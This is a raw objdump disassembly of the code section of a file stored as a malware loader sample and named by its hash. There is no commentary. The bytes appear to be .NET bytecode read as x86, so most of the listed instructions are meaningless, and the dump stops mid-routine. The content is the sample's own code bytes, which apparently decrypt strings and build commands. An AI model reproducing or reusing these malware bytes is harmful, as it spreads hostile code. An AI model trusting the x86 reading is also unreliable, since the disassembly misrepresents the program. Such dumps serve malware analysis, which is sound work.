
malware_samples/loader/1c1ef5f2c13da4e6399a1d1b4600dfc474c3a74447fdff219f0df449e4da908c.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	90                   	nop
  402001:	7f 00                	jg     0x402003
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 ec 58 00       	add    $0x58ec00,%eax
  402013:	00 68 26             	add    %ch,0x26(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	0b 00                	or     (%eax),%eax
  40201e:	00 06                	add    %al,(%esi)
  402020:	e8 4a 00 00 04       	call   0x440206f
  402025:	0e                   	push   %cs
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	7a 02                	jp     0x402054
  402052:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	02 03                	add    (%ebx),%al
  402059:	7d 02                	jge    0x40205d
  40205b:	00 00                	add    %al,(%eax)
  40205d:	04 02                	add    $0x2,%al
  40205f:	28 15 00 00 0a 6f    	sub    %dl,0x6f0a0000
  402065:	16                   	push   %ss
  402066:	00 00                	add    %al,(%eax)
  402068:	0a 7d 04             	or     0x4(%ebp),%bh
  40206b:	00 00                	add    %al,(%eax)
  40206d:	04 2a                	add    $0x2a,%al
  40206f:	00 06                	add    %al,(%esi)
  402071:	2a 00                	sub    (%eax),%al
  402073:	00 13                	add    %dl,(%ebx)
  402075:	30 03                	xor    %al,(%ebx)
  402077:	00 29                	add    %ch,(%ecx)
  402079:	01 00                	add    %eax,(%eax)
  40207b:	00 01                	add    %al,(%ecx)
  40207d:	00 00                	add    %al,(%eax)
  40207f:	11 02                	adc    %eax,(%edx)
  402081:	7b 02                	jnp    0x402085
  402083:	00 00                	add    %al,(%eax)
  402085:	04 0a                	add    $0xa,%al
  402087:	06                   	push   %es
  402088:	45                   	inc    %ebp
  402089:	09 00                	or     %eax,(%eax)
  40208b:	00 00                	add    %al,(%eax)
  40208d:	02 00                	add    (%eax),%al
  40208f:	00 00                	add    %al,(%eax)
  402091:	1d 00 00 00 3f       	sbb    $0x3f000000,%eax
  402096:	00 00                	add    %al,(%eax)
  402098:	00 5a 00             	add    %bl,0x0(%edx)
  40209b:	00 00                	add    %al,(%eax)
  40209d:	7c 00                	jl     0x40209f
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	97                   	xchg   %eax,%edi
  4020a2:	00 00                	add    %al,(%eax)
  4020a4:	00 b9 00 00 00 d4    	add    %bh,-0x2c000000(%ecx)
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	00 ef                	add    %ch,%bh
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	00 16                	add    %dl,(%esi)
  4020b2:	2a 02                	sub    (%edx),%al
  4020b4:	15 7d 02 00 00       	adc    $0x27d,%eax
  4020b9:	04 02                	add    $0x2,%al
  4020bb:	20 4c 9d ea          	and    %cl,-0x16(%ebp,%ebx,4)
  4020bf:	1b 7d 03             	sbb    0x3(%ebp),%edi
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	04 02                	add    $0x2,%al
  4020c6:	17                   	pop    %ss
  4020c7:	7d 02                	jge    0x4020cb
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	04 17                	add    $0x17,%al
  4020cd:	2a 02                	sub    (%edx),%al
  4020cf:	15 7d 02 00 00       	adc    $0x27d,%eax
  4020d4:	04 02                	add    $0x2,%al
  4020d6:	02 7b 05             	add    0x5(%ebx),%bh
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 20                	add    $0x20,%al
  4020dd:	ce                   	into
  4020de:	03 55 55             	add    0x55(%ebp),%edx
  4020e1:	61                   	popa
  4020e2:	7d 03                	jge    0x4020e7
  4020e4:	00 00                	add    %al,(%eax)
  4020e6:	04 02                	add    $0x2,%al
  4020e8:	18 7d 02             	sbb    %bh,0x2(%ebp)
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	04 17                	add    $0x17,%al
  4020ef:	2a 02                	sub    (%edx),%al
  4020f1:	15 7d 02 00 00       	adc    $0x27d,%eax
  4020f6:	04 02                	add    $0x2,%al
  4020f8:	20 f6                	and    %dh,%dh
  4020fa:	05 ac 3c 7d 03       	add    $0x37d3cac,%eax
  4020ff:	00 00                	add    %al,(%eax)
  402101:	04 02                	add    $0x2,%al
  402103:	19 7d 02             	sbb    %edi,0x2(%ebp)
  402106:	00 00                	add    %al,(%eax)
  402108:	04 17                	add    $0x17,%al
  40210a:	2a 02                	sub    (%edx),%al
  40210c:	15 7d 02 00 00       	adc    $0x27d,%eax
  402111:	04 02                	add    $0x2,%al
  402113:	02 7b 05             	add    0x5(%ebx),%bh
  402116:	00 00                	add    %al,(%eax)
  402118:	04 20                	add    $0x20,%al
  40211a:	ce                   	into
  40211b:	03 55 55             	add    0x55(%ebp),%edx
  40211e:	61                   	popa
  40211f:	7d 03                	jge    0x402124
  402121:	00 00                	add    %al,(%eax)
  402123:	04 02                	add    $0x2,%al
  402125:	1a 7d 02             	sbb    0x2(%ebp),%bh
  402128:	00 00                	add    %al,(%eax)
  40212a:	04 17                	add    $0x17,%al
  40212c:	2a 02                	sub    (%edx),%al
  40212e:	15 7d 02 00 00       	adc    $0x27d,%eax
  402133:	04 02                	add    $0x2,%al
  402135:	20 df                	and    %bl,%bh
  402137:	14 8f                	adc    $0x8f,%al
  402139:	b9 7d 03 00 00       	mov    $0x37d,%ecx
  40213e:	04 02                	add    $0x2,%al
  402140:	1b 7d 02             	sbb    0x2(%ebp),%edi
  402143:	00 00                	add    %al,(%eax)
  402145:	04 17                	add    $0x17,%al
  402147:	2a 02                	sub    (%edx),%al
  402149:	15 7d 02 00 00       	adc    $0x27d,%eax
  40214e:	04 02                	add    $0x2,%al
  402150:	02 7b 05             	add    0x5(%ebx),%bh
  402153:	00 00                	add    %al,(%eax)
  402155:	04 20                	add    $0x20,%al
  402157:	04 18                	add    $0x18,%al
  402159:	2e 0e                	cs push %cs
  40215b:	61                   	popa
  40215c:	7d 03                	jge    0x402161
  40215e:	00 00                	add    %al,(%eax)
  402160:	04 02                	add    $0x2,%al
  402162:	1c 7d                	sbb    $0x7d,%al
  402164:	02 00                	add    (%eax),%al
  402166:	00 04 17             	add    %al,(%edi,%edx,1)
  402169:	2a 02                	sub    (%edx),%al
  40216b:	15 7d 02 00 00       	adc    $0x27d,%eax
  402170:	04 02                	add    $0x2,%al
  402172:	20 cf                	and    %cl,%bh
  402174:	89 b8 85 7d 03 00    	mov    %edi,0x37d85(%eax)
  40217a:	00 04 02             	add    %al,(%edx,%eax,1)
  40217d:	1d 7d 02 00 00       	sbb    $0x27d,%eax
  402182:	04 17                	add    $0x17,%al
  402184:	2a 02                	sub    (%edx),%al
  402186:	15 7d 02 00 00       	adc    $0x27d,%eax
  40218b:	04 02                	add    $0x2,%al
  40218d:	20 0f                	and    %cl,(%edi)
  40218f:	55                   	push   %ebp
  402190:	4f                   	dec    %edi
  402191:	97                   	xchg   %eax,%edi
  402192:	7d 03                	jge    0x402197
  402194:	00 00                	add    %al,(%eax)
  402196:	04 02                	add    $0x2,%al
  402198:	1e                   	push   %ds
  402199:	7d 02                	jge    0x40219d
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 17                	add    $0x17,%al
  40219f:	2a 02                	sub    (%edx),%al
  4021a1:	15 7d 02 00 00       	adc    $0x27d,%eax
  4021a6:	04 16                	add    $0x16,%al
  4021a8:	2a 00                	sub    (%eax),%al
  4021aa:	00 00                	add    %al,(%eax)
  4021ac:	1e                   	push   %ds
  4021ad:	02 7b 03             	add    0x3(%ebx),%bh
  4021b0:	00 00                	add    %al,(%eax)
  4021b2:	04 2a                	add    $0x2a,%al
  4021b4:	1a 73 17             	sbb    0x17(%ebx),%dh
  4021b7:	00 00                	add    %al,(%eax)
  4021b9:	0a 7a 00             	or     0x0(%edx),%bh
  4021bc:	32 02                	xor    (%edx),%al
  4021be:	7b 03                	jnp    0x4021c3
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 8c                	add    $0x8c,%al
  4021c4:	2d 00 00 01 2a       	sub    $0x2a010000,%eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 13                	add    %dl,(%ebx)
  4021cd:	30 02                	xor    %al,(%edx)
  4021cf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	02 00                	add    (%eax),%al
  4021d6:	00 11                	add    %dl,(%ecx)
  4021d8:	02 7b 02             	add    0x2(%ebx),%bh
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	04 1f                	add    $0x1f,%al
  4021df:	fe                   	(bad)
  4021e0:	33 1d 02 7b 04 00    	xor    0x47b02,%ebx
  4021e6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021e9:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4021ee:	16                   	push   %ss
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	0a 33                	or     (%ebx),%dh
  4021f3:	0b 02                	or     (%edx),%eax
  4021f5:	16                   	push   %ss
  4021f6:	7d 02                	jge    0x4021fa
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 02                	add    $0x2,%al
  4021fc:	0a 2b                	or     (%ebx),%ch
  4021fe:	07                   	pop    %es
  4021ff:	16                   	push   %ss
  402200:	73 01                	jae    0x402203
  402202:	00 00                	add    %al,(%eax)
  402204:	06                   	push   %es
  402205:	0a 06                	or     (%esi),%al
  402207:	02 7b 06             	add    0x6(%ebx),%bh
  40220a:	00 00                	add    %al,(%eax)
  40220c:	04 7d                	add    $0x7d,%al
  40220e:	05 00 00 04 06       	add    $0x6040000,%eax
  402213:	2a 1e                	sub    (%esi),%bl
  402215:	02 28                	add    (%eax),%ch
  402217:	07                   	pop    %es
  402218:	00 00                	add    %al,(%eax)
  40221a:	06                   	push   %es
  40221b:	2a 1e                	sub    (%esi),%bl
  40221d:	02 28                	add    (%eax),%ch
  40221f:	14 00                	adc    $0x0,%al
  402221:	00 0a                	add    %cl,(%edx)
  402223:	2a 42 20             	sub    0x20(%edx),%al
  402226:	b5 04                	mov    $0x4,%ch
  402228:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  40222e:	06                   	push   %es
  40222f:	80 07 00             	addb   $0x0,(%edi)
  402232:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402235:	00 00                	add    %al,(%eax)
  402237:	00 1b                	add    %bl,(%ebx)
  402239:	30 06                	xor    %al,(%esi)
  40223b:	00 a9 04 00 00 03    	add    %ch,0x3000004(%ecx)
  402241:	00 00                	add    %al,(%eax)
  402243:	11 17                	adc    %edx,(%edi)
  402245:	20 fe                	and    %bh,%dh
  402247:	04 0a                	add    $0xa,%al
  402249:	98                   	cwtl
  40224a:	28 19                	sub    %bl,(%ecx)
  40224c:	00 00                	add    %al,(%eax)
  40224e:	06                   	push   %es
  40224f:	12 19                	adc    (%ecx),%bl
  402251:	73 18                	jae    0x40226b
  402253:	00 00                	add    %al,(%eax)
  402255:	0a 13                	or     (%ebx),%dl
  402257:	11 11                	adc    %edx,(%ecx)
  402259:	19 2d 14 20 c1 04    	sbb    %ebp,0x4c12014
  40225f:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402265:	06                   	push   %es
  402266:	28 19                	sub    %bl,(%ecx)
  402268:	00 00                	add    %al,(%eax)
  40226a:	0a dd                	or     %ch,%bl
  40226c:	7c 04                	jl     0x402272
  40226e:	00 00                	add    %al,(%eax)
  402270:	28 0d 00 00 06 1f    	sub    %cl,0x1f060000
  402276:	29 28                	sub    %ebp,(%eax)
  402278:	1a 00                	sbb    (%eax),%al
  40227a:	00 0a                	add    %cl,(%edx)
  40227c:	20 35 04 0a 98 28    	and    %dh,0x28980a04
  402282:	19 00                	sbb    %eax,(%eax)
  402284:	00 06                	add    %al,(%esi)
  402286:	28 1b                	sub    %bl,(%ebx)
  402288:	00 00                	add    %al,(%eax)
  40228a:	0a 0a                	or     (%edx),%cl
  40228c:	06                   	push   %es
  40228d:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402290:	00 0a                	add    %cl,(%edx)
  402292:	2d 17 1f 25 28       	sub    $0x28251f17,%eax
  402297:	1a 00                	sbb    (%eax),%al
  402299:	00 0a                	add    %cl,(%edx)
  40229b:	20 35 04 0a 98 28    	and    %dh,0x28980a04
  4022a1:	19 00                	sbb    %eax,(%eax)
  4022a3:	00 06                	add    %al,(%esi)
  4022a5:	28 1b                	sub    %bl,(%ebx)
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	0a 0a                	or     (%edx),%cl
  4022ab:	06                   	push   %es
  4022ac:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4022af:	00 0a                	add    %cl,(%edx)
  4022b1:	2d 0b 20 01 04       	sub    $0x401200b,%eax
  4022b6:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4022bc:	06                   	push   %es
  4022bd:	0a 20                	or     (%eax),%ah
  4022bf:	70 04                	jo     0x4022c5
  4022c1:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4022c7:	06                   	push   %es
  4022c8:	13 09                	adc    (%ecx),%ecx
  4022ca:	1f                   	pop    %ds
  4022cb:	1c 28                	sbb    $0x28,%al
  4022cd:	1a 00                	sbb    (%eax),%al
  4022cf:	00 0a                	add    %cl,(%edx)
  4022d1:	20 62 04             	and    %ah,0x4(%edx)
  4022d4:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4022da:	06                   	push   %es
  4022db:	28 1b                	sub    %bl,(%ebx)
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	0a 0d 09 28 14 00    	or     0x142809,%cl
  4022e5:	00 06                	add    %al,(%esi)
  4022e7:	1f                   	pop    %ds
  4022e8:	1c 28                	sbb    $0x28,%al
  4022ea:	1a 00                	sbb    (%eax),%al
  4022ec:	00 0a                	add    %cl,(%edx)
  4022ee:	20 5c 04 0a          	and    %bl,0xa(%esp,%eax,1)
  4022f2:	98                   	cwtl
  4022f3:	28 19                	sub    %bl,(%ecx)
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	06                   	push   %es
  4022f8:	28 1b                	sub    %bl,(%ebx)
  4022fa:	00 00                	add    %al,(%eax)
  4022fc:	0a 13                	or     (%ebx),%dl
  4022fe:	04 1f                	add    $0x1f,%al
  402300:	1c 28                	sbb    $0x28,%al
  402302:	1a 00                	sbb    (%eax),%al
  402304:	00 0a                	add    %cl,(%edx)
  402306:	20 40 04             	and    %al,0x4(%eax)
  402309:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  40230f:	06                   	push   %es
  402310:	28 1b                	sub    %bl,(%ebx)
  402312:	00 00                	add    %al,(%eax)
  402314:	0a 13                	or     (%ebx),%dl
  402316:	05 1f 1a 28 1a       	add    $0x1a281a1f,%eax
  40231b:	00 00                	add    %al,(%eax)
  40231d:	0a 20                	or     (%eax),%ah
  40231f:	b3 05                	mov    $0x5,%bl
  402321:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402327:	06                   	push   %es
  402328:	28 1b                	sub    %bl,(%ebx)
  40232a:	00 00                	add    %al,(%eax)
  40232c:	0a 0b                	or     (%ebx),%cl
  40232e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402331:	1c 00                	sbb    $0x0,%al
  402333:	00 0a                	add    %cl,(%edx)
  402335:	2d 5a 18 8d 4e       	sub    $0x4e8d185a,%eax
  40233a:	00 00                	add    %al,(%eax)
  40233c:	01 25 16 20 a5 05    	add    %esp,0x5a52016
  402342:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402348:	06                   	push   %es
  402349:	a2 25 17 20 fd       	mov    %al,0xfd201725
  40234e:	05 0a 98 28 19       	add    $0x1928980a,%eax
  402353:	00 00                	add    %al,(%eax)
  402355:	06                   	push   %es
  402356:	a2 13 0b 73 1d       	mov    %al,0x1d730b13
  40235b:	00 00                	add    %al,(%eax)
  40235d:	0a 13                	or     (%ebx),%dl
  40235f:	12 11                	adc    (%ecx),%dl
  402361:	0b 11                	or     (%ecx),%edx
  402363:	12 11                	adc    (%ecx),%dl
  402365:	0b 8e 69 6f 1e 00    	or     0x1e6f69(%esi),%ecx
  40236b:	00 0a                	add    %cl,(%edx)
  40236d:	9a 13 13 73 1f 00 00 	lcall  $0x0,$0x1f731313
  402374:	0a 13                	or     (%ebx),%dl
  402376:	0c 11                	or     $0x11,%al
  402378:	0c 11                	or     $0x11,%al
  40237a:	13 11                	adc    (%ecx),%edx
  40237c:	04 6f                	add    $0x6f,%al
  40237e:	20 00                	and    %al,(%eax)
  402380:	00 0a                	add    %cl,(%edx)
  402382:	de 08                	fimuls (%eax)
  402384:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  402387:	21 00                	and    %eax,(%eax)
  402389:	00 0a                	add    %cl,(%edx)
  40238b:	dc de                	(bad)
  40238d:	03 26                	add    (%esi),%esp
  40238f:	de 00                	fiadds (%eax)
  402391:	20 d2                	and    %dl,%dl
  402393:	05 0a 98 28 19       	add    $0x1928980a,%eax
  402398:	00 00                	add    %al,(%eax)
  40239a:	06                   	push   %es
  40239b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40239e:	3c 00                	cmp    $0x0,%al
  4023a0:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4023a6:	06                   	push   %es
  4023a7:	28 22                	sub    %ah,(%edx)
  4023a9:	00 00                	add    %al,(%eax)
  4023ab:	0a 13                	or     (%ebx),%dl
  4023ad:	0a 11                	or     (%ecx),%dl
  4023af:	0a 28                	or     (%eax),%ch
  4023b1:	11 00                	adc    %eax,(%eax)
  4023b3:	00 06                	add    %al,(%esi)
  4023b5:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4023b8:	05 11 14 28 23       	add    $0x23281411,%eax
  4023bd:	00 00                	add    %al,(%eax)
  4023bf:	0a de                	or     %dh,%bl
  4023c1:	03 26                	add    (%esi),%esp
  4023c3:	de 00                	fiadds (%eax)
  4023c5:	00 11                	add    %dl,(%ecx)
  4023c7:	0a 28                	or     (%eax),%ch
  4023c9:	11 00                	adc    %eax,(%eax)
  4023cb:	00 06                	add    %al,(%esi)
  4023cd:	13 15 07 11 15 28    	adc    0x28151107,%edx
  4023d3:	23 00                	and    (%eax),%eax
  4023d5:	00 0a                	add    %cl,(%edx)
  4023d7:	de 03                	fiadds (%ebx)
  4023d9:	26 de 00             	fiadds %es:(%eax)
  4023dc:	00 1f                	add    %bl,(%edi)
  4023de:	1c 28                	sbb    $0x28,%al
  4023e0:	1a 00                	sbb    (%eax),%al
  4023e2:	00 0a                	add    %cl,(%edx)
  4023e4:	20 66 00             	and    %ah,0x0(%esi)
  4023e7:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4023ed:	06                   	push   %es
  4023ee:	28 1b                	sub    %bl,(%ebx)
  4023f0:	00 00                	add    %al,(%eax)
  4023f2:	0a 13                	or     (%ebx),%dl
  4023f4:	06                   	push   %es
  4023f5:	11 06                	adc    %eax,(%esi)
  4023f7:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4023fa:	00 0a                	add    %cl,(%edx)
  4023fc:	2d 16 11 06 28       	sub    $0x28061116,%eax
  402401:	43                   	inc    %ebx
  402402:	00 00                	add    %al,(%eax)
  402404:	06                   	push   %es
  402405:	28 10                	sub    %dl,(%eax)
  402407:	00 00                	add    %al,(%eax)
  402409:	06                   	push   %es
  40240a:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40240d:	00 0a                	add    %cl,(%edx)
  40240f:	de 03                	fiadds (%ebx)
  402411:	26 de 00             	fiadds %es:(%eax)
  402414:	11 06                	adc    %eax,(%esi)
  402416:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	2d 6f 1f 09 8d       	sub    $0x8d091f6f,%eax
  402420:	4e                   	dec    %esi
  402421:	00 00                	add    %al,(%eax)
  402423:	01 25 16 20 49 00    	add    %esp,0x492016
  402429:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  40242f:	06                   	push   %es
  402430:	a2 25 17 11 09       	mov    %al,0x9111725
  402435:	a2 25 18 20 a8       	mov    %al,0xa8201825
  40243a:	01 0a                	add    %ecx,(%edx)
  40243c:	98                   	cwtl
  40243d:	28 19                	sub    %bl,(%ecx)
  40243f:	00 00                	add    %al,(%eax)
  402441:	06                   	push   %es
  402442:	a2 25 19 11 05       	mov    %al,0x5111925
  402447:	a2 25 1a 20 9f       	mov    %al,0x9f201a25
  40244c:	01 0a                	add    %ecx,(%edx)
  40244e:	98                   	cwtl
  40244f:	28 19                	sub    %bl,(%ecx)
  402451:	00 00                	add    %al,(%eax)
  402453:	06                   	push   %es
  402454:	a2 25 1b 11 05       	mov    %al,0x5111b25
  402459:	a2 25 1c 20 82       	mov    %al,0x82201c25
  40245e:	01 0a                	add    %ecx,(%edx)
  402460:	98                   	cwtl
  402461:	28 19                	sub    %bl,(%ecx)
  402463:	00 00                	add    %al,(%eax)
  402465:	06                   	push   %es
  402466:	a2 25 1d 09 a2       	mov    %al,0xa2091d25
  40246b:	25 1e 20 f6 01       	and    $0x1f6201e,%eax
  402470:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402476:	06                   	push   %es
  402477:	a2 28 25 00 00       	mov    %al,0x2528
  40247c:	0a 13                	or     (%ebx),%dl
  40247e:	16                   	push   %ss
  40247f:	06                   	push   %es
  402480:	11 16                	adc    %edx,(%esi)
  402482:	09 15 28 13 00 00    	or     %edx,0x1328
  402488:	06                   	push   %es
  402489:	26 2b 6d 1f          	sub    %es:0x1f(%ebp),%ebp
  40248d:	09 8d 4e 00 00 01    	or     %ecx,0x100004e(%ebp)
  402493:	25 16 20 49 00       	and    $0x492016,%eax
  402498:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  40249e:	06                   	push   %es
  40249f:	a2 25 17 11 09       	mov    %al,0x9111725
  4024a4:	a2 25 18 20 a8       	mov    %al,0xa8201825
  4024a9:	01 0a                	add    %ecx,(%edx)
  4024ab:	98                   	cwtl
  4024ac:	28 19                	sub    %bl,(%ecx)
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	06                   	push   %es
  4024b1:	a2 25 19 11 06       	mov    %al,0x6111925
  4024b6:	a2 25 1a 20 9f       	mov    %al,0x9f201a25
  4024bb:	01 0a                	add    %ecx,(%edx)
  4024bd:	98                   	cwtl
  4024be:	28 19                	sub    %bl,(%ecx)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	06                   	push   %es
  4024c3:	a2 25 1b 11 05       	mov    %al,0x5111b25
  4024c8:	a2 25 1c 20 82       	mov    %al,0x82201c25
  4024cd:	01 0a                	add    %ecx,(%edx)
  4024cf:	98                   	cwtl
  4024d0:	28 19                	sub    %bl,(%ecx)
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	06                   	push   %es
  4024d5:	a2 25 1d 09 a2       	mov    %al,0xa2091d25
  4024da:	25 1e 20 f6 01       	and    $0x1f6201e,%eax
  4024df:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4024e5:	06                   	push   %es
  4024e6:	a2 28 25 00 00       	mov    %al,0x2528
  4024eb:	0a 13                	or     (%ebx),%dl
  4024ed:	17                   	pop    %ss
  4024ee:	06                   	push   %es
  4024ef:	11 17                	adc    %edx,(%edi)
  4024f1:	09 15 28 13 00 00    	or     %edx,0x1328
  4024f7:	06                   	push   %es
  4024f8:	26 de 03             	fiadds %es:(%ebx)
  4024fb:	26 de 00             	fiadds %es:(%eax)
  4024fe:	00 1f                	add    %bl,(%edi)
  402500:	1a 28                	sbb    (%eax),%ch
  402502:	1a 00                	sbb    (%eax),%al
  402504:	00 0a                	add    %cl,(%edx)
  402506:	20 b2 03 0a 98 28    	and    %dh,0x28980a03(%edx)
  40250c:	19 00                	sbb    %eax,(%eax)
  40250e:	00 06                	add    %al,(%esi)
  402510:	28 1b                	sub    %bl,(%ebx)
  402512:	00 00                	add    %al,(%eax)
  402514:	0a 13                	or     (%ebx),%dl
  402516:	07                   	pop    %es
  402517:	11 07                	adc    %eax,(%edi)
  402519:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40251c:	00 0a                	add    %cl,(%edx)
  40251e:	2d 16 11 07 28       	sub    $0x28071116,%eax
  402523:	43                   	inc    %ebx
  402524:	00 00                	add    %al,(%eax)
  402526:	06                   	push   %es
  402527:	28 10                	sub    %dl,(%eax)
  402529:	00 00                	add    %al,(%eax)
  40252b:	06                   	push   %es
  40252c:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40252f:	00 0a                	add    %cl,(%edx)
  402531:	de 03                	fiadds (%ebx)
  402533:	26 de 00             	fiadds %es:(%eax)
  402536:	11 07                	adc    %eax,(%edi)
  402538:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40253b:	00 0a                	add    %cl,(%edx)
  40253d:	2c 3c                	sub    $0x3c,%al
  40253f:	1b 8d 4e 00 00 01    	sbb    0x100004e(%ebp),%ecx
  402545:	25 16 20 9a 03       	and    $0x39a2016,%eax
  40254a:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402550:	06                   	push   %es
  402551:	a2 25 17 11 07       	mov    %al,0x7111725
  402556:	a2 25 18 20 92       	mov    %al,0x92201825
  40255b:	03 0a                	add    (%edx),%ecx
  40255d:	98                   	cwtl
  40255e:	28 19                	sub    %bl,(%ecx)
  402560:	00 00                	add    %al,(%eax)
  402562:	06                   	push   %es
  402563:	a2 25 19 07 a2       	mov    %al,0xa2071925
  402568:	25 1a 20 9a 03       	and    $0x39a201a,%eax
  40256d:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402573:	06                   	push   %es
  402574:	a2 28 25 00 00       	mov    %al,0x2528
  402579:	0a 0b                	or     (%ebx),%cl
  40257b:	20 8c 03 0a 98 28 19 	and    %cl,0x1928980a(%ebx,%eax,1)
  402582:	00 00                	add    %al,(%eax)
  402584:	06                   	push   %es
  402585:	20 d0                	and    %dl,%al
  402587:	03 0a                	add    (%edx),%ecx
  402589:	98                   	cwtl
  40258a:	28 19                	sub    %bl,(%ecx)
  40258c:	00 00                	add    %al,(%eax)
  40258e:	06                   	push   %es
  40258f:	7e 26                	jle    0x4025b7
  402591:	00 00                	add    %al,(%eax)
  402593:	0a 17                	or     (%edi),%dl
  402595:	28 27                	sub    %ah,(%edi)
  402597:	00 00                	add    %al,(%eax)
  402599:	06                   	push   %es
  40259a:	6f                   	outsl  %ds:(%esi),(%dx)
  40259b:	27                   	daa
  40259c:	00 00                	add    %al,(%eax)
  40259e:	0a 13                	or     (%ebx),%dl
  4025a0:	0d 11 0d 28 28       	or     $0x28280d11,%eax
  4025a5:	00 00                	add    %al,(%eax)
  4025a7:	0a 2c 1f             	or     (%edi,%ebx,1),%ch
  4025aa:	20 8c 03 0a 98 28 19 	and    %cl,0x1928980a(%ebx,%eax,1)
  4025b1:	00 00                	add    %al,(%eax)
  4025b3:	06                   	push   %es
  4025b4:	20 d0                	and    %dl,%al
  4025b6:	03 0a                	add    (%edx),%ecx
  4025b8:	98                   	cwtl
  4025b9:	28 19                	sub    %bl,(%ecx)
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	07                   	pop    %es
  4025bf:	17                   	pop    %ss
  4025c0:	17                   	pop    %ss
  4025c1:	28 28                	sub    %ch,(%eax)
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	06                   	push   %es
  4025c6:	26 2b 27             	sub    %es:(%edi),%esp
  4025c9:	11 0d 07 28 29 00    	adc    %ecx,0x292807
  4025cf:	00 0a                	add    %cl,(%edx)
  4025d1:	2c 1d                	sub    $0x1d,%al
  4025d3:	20 8c 03 0a 98 28 19 	and    %cl,0x1928980a(%ebx,%eax,1)
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	06                   	push   %es
  4025dd:	20 d0                	and    %dl,%al
  4025df:	03 0a                	add    (%edx),%ecx
  4025e1:	98                   	cwtl
  4025e2:	28 19                	sub    %bl,(%ecx)
  4025e4:	00 00                	add    %al,(%eax)
  4025e6:	06                   	push   %es
  4025e7:	07                   	pop    %es
  4025e8:	17                   	pop    %ss
  4025e9:	17                   	pop    %ss
  4025ea:	28 28                	sub    %ch,(%eax)
  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	06                   	push   %es
  4025ef:	26 20 3d 03 0a 98 28 	and    %bh,%es:0x28980a03
  4025f6:	19 00                	sbb    %eax,(%eax)
  4025f8:	00 06                	add    %al,(%esi)
  4025fa:	20 d0                	and    %dl,%al
  4025fc:	03 0a                	add    (%edx),%ecx
  4025fe:	98                   	cwtl
  4025ff:	28 19                	sub    %bl,(%ecx)
  402601:	00 00                	add    %al,(%eax)
  402603:	06                   	push   %es
  402604:	14 17                	adc    $0x17,%al
  402606:	28 27                	sub    %ah,(%edi)
  402608:	00 00                	add    %al,(%eax)
  40260a:	06                   	push   %es
  40260b:	13 0e                	adc    (%esi),%ecx
  40260d:	11 0e                	adc    %ecx,(%esi)
  40260f:	2c 37                	sub    $0x37,%al
  402611:	11 0e                	adc    %ecx,(%esi)
  402613:	74 03                	je     0x402618
  402615:	00 00                	add    %al,(%eax)
  402617:	1b 16                	sbb    (%esi),%edx
  402619:	91                   	xchg   %eax,%ecx
  40261a:	18 2e                	sbb    %ch,(%esi)
  40261c:	2b 1f                	sub    (%edi),%ebx
  40261e:	0c 8d                	or     $0x8d,%al
  402620:	08 00                	or     %al,(%eax)
